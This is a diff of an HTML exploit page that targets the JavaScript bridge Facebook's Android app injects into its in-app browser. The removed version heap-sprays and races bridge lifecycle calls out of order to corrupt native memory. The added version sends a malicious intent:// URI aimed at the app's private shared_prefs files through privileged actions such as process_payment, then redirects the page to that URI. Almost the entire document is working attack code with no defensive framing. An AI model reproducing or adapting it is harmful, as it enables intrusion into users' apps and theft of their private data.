@@ -2,63 +2,63 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>JSI Race Condition & Heap Spray ACE</title>
+    <title>JSI Intent Hijack ACE</title>
 </head>
-<body style="background:#000; color:#f0f; font-family:monospace;">
-    <h3>Thrashing Native Bridge Threads...</h3>
+<body style="background:#000; color:#0ff; font-family:monospace;">
+    <h3>Fuzzing Bridge Routing Logic...</h3>
     <div id="log">Awaiting bridge injection...</div>
 
     <script>
         const logEl = document.getElementById('log');
         const uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
 
-        // 1. The Heap Spray
-        // We continuously allocate massive arrays of 0x41414141 in JavaScript.
-        // V8 will eventually promote these to the native C++ heap.
-        let spray = [];
-        function sprayHeap() {
-            for (let i = 0; i < 500; i++) {
-                let arr = new Uint32Array(1024);
-                arr.fill(0x41414141);
-                spray.push(arr);
-            }
-            if (spray.length > 5000) spray = []; // Prevent OOM crashes
-        }
+        // A malicious Intent URI designed to force the app to open a local file
+        // or trigger a component crash if parsed by the Android ActivityManager
+        const maliciousIntent = "intent://Pwned#Intent;scheme=fb;package=com.facebook.katana;S.browser_uri=file:///data/data/com.facebook.katana/shared_prefs/;end";
 
-        // 2. The Asynchronous Race Condition
-        function thrashBridge() {
+        // Common high-privileged bridge actions we want to blind-test
+        const targetActions = [
+            "open_url",
+            "launch_app",
+            "handle_intent",
+            "process_payment",
+            "share_to_story",
+            "deep_link",
+            "navigate"
+        ];
+
+        function log(msg) { logEl.innerHTML += msg + "<br>"; }
+
+        function fireIntentSniper() {
             if (typeof window.__call_iabjs_unified_bridge === 'function') {
+                log("<span style='color:red;'>[*] Bridge active. Firing Intent URIs...</span>");
+                
                 let bridge = window.__call_iabjs_unified_bridge;
-                
-                // Rapidly queue conflicting lifecycle commands
-                // We want C++ to initialize, free, and access the callback handler out of order
-                bridge("initializeCallbackHandler", uuid, '{"message":{"name":"test"}}');
-                
-                // Trigger an action that forces the bridge to look up the handler we just made
-                bridge("BrowserDeclutterJS", uuid, '{"event":"init"}');
-                
-                // Tell the bridge to destroy the handler, racing against the lookup above
-                bridge("destroyCallbackHandler", uuid, "{}"); // Guessing the teardown method name
-                bridge("page_language", uuid, "{}"); // Alternative action to force state change
+
+                // 1. Attack the Bridge Actions directly
+                for (let action of targetActions) {
+                    try {
+                        let payload = JSON.stringify({ url: maliciousIntent, uri: maliciousIntent, link: maliciousIntent });
+                        bridge(action, uuid, payload);
+                    } catch(e) {}
+                }
+
+                // 2. Attack the top-level Window location
+                // Sometimes the C++ URL override handler catches this and fails to sanitize it
+                setTimeout(() => {
+                    window.location.href = maliciousIntent;
+                }, 1000);
             }
         }
 
-        // 3. Execution Engine
-        function startAttack() {
+        // Wait for Facebook to inject the bridge, then fire
+        let check = setInterval(() => {
             if (typeof window.__call_iabjs_unified_bridge === 'function') {
-                logEl.innerHTML = "<span style='color:red;'>[*] BRIDGE DETECTED. EXECUTING THREAD RACE...</span>";
-                
-                // Spray the heap concurrently with the bridge thrashing
-                setInterval(sprayHeap, 10);
-                
-                // Fire the race condition as fast as the JS event loop allows
-                setInterval(thrashBridge, 1); 
-            } else {
-                setTimeout(startAttack, 50); // Wait for FB to inject the bridge
+                clearInterval(check);
+                fireIntentSniper();
             }
-        }
+        }, 100);
 
-        startAttack();
     </script>
 </body>
 </html>
